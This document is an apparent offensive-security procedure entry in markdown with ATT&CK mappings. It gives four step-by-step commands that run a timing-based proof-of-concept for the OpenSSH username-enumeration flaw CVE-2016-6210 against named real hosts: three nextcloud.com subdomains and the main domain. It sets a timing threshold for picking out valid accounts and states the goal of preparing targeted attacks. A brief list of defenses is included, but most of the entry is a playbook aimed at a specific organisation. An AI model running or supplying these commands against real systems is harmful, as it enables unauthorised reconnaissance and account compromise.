---
id: proc-004
tags:
  - multi-target-enumeration
  - ssh-scanning
type: procedure
tools:
  - '[[tools/POC-py-for-CVE-2016-6210]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/python-poc-py-username-enumeration-stats-nextcloud-com]]'
  - '[[commands/python-poc-py-username-enumeration-help-nextcloud-com]]'
  - '[[commands/python-poc-py-username-enumeration-lists-nextcloud-com]]'
  - '[[commands/python-poc-py-username-enumeration-nextcloud-com]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:58.930Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Extend-Enumeration-to-Additional-Nextcloud-Subdomains

## Summary

This procedure extends the username enumeration attack to additional vulnerable Nextcloud subdomains (stats, help, lists, nextcloud.com) using the same timing-based POC script to maximize account discovery across the infrastructure.

## Description

Building on the primary enumeration, this targets other subdomains running vulnerable OpenSSH 7.2p2, repeating SSH timing attacks to identify consistent valid usernames. This reveals shared accounts or infrastructure patterns, enhancing the impact of information disclosure. Each run uses the same large password and username list; aggregate results to find high-confidence valid users. Prerequisites: Successful prior enumeration and network access to all targets.

## Requirements

1. POC.py and usernames.txt from previous steps
2. Python environment
3. Connectivity to targets on port 22

## Defense

Defensive measures and detection strategies:

- Segment SSH services across subdomains with different credentials
- Deploy IDS to detect multi-host SSH probing patterns
- Regularly audit and rotate usernames on exposed services

## Objectives

1. Enumerate usernames on four additional subdomains
2. Cross-reference results for valid account confirmation
3. Complete reconnaissance for targeted attacks

## Instructions

### Step 1: Enumerate Stats Subdomain

**Context**: Run POC on stats.nextcloud.com to check for valid users.

**Command** ([[commands/python-poc-py-username-enumeration-stats-nextcloud-com]]):
```bash
python POC.py stats.nextcloud.com -U usernames.txt
```

> Outputs timings; analyze for >0.047s responses indicating valid usernames.

### Step 2: Enumerate Help Subdomain

**Context**: Repeat for help.nextcloud.com.

**Command** ([[commands/python-poc-py-username-enumeration-help-nextcloud-com]]):
```bash
python POC.py help.nextcloud.com -U usernames.txt
```

> Similar output; log for comparison.

### Step 3: Enumerate Lists Subdomain

**Context**: Target lists.nextcloud.com.

**Command** ([[commands/python-poc-py-username-enumeration-lists-nextcloud-com]]):
```bash
python POC.py lists.nextcloud.com -U usernames.txt
```

> Collect timings for analysis.

### Step 4: Enumerate Main Domain

**Context**: Final run on nextcloud.com.

**Command** ([[commands/python-poc-py-username-enumeration-nextcloud-com]]):
```bash
python POC.py nextcloud.com -U usernames.txt
```

> Aggregate all outputs to identify overlapping valid usernames.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/python-poc-py-username-enumeration-stats-nextcloud-com]]
- [[commands/python-poc-py-username-enumeration-help-nextcloud-com]]
- [[commands/python-poc-py-username-enumeration-lists-nextcloud-com]]
- [[commands/python-poc-py-username-enumeration-nextcloud-com]]

## Tools Used

- [[tools/POC-py-for-CVE-2016-6210]]

## Tags

- multi-target-enumeration
- ssh-scanning
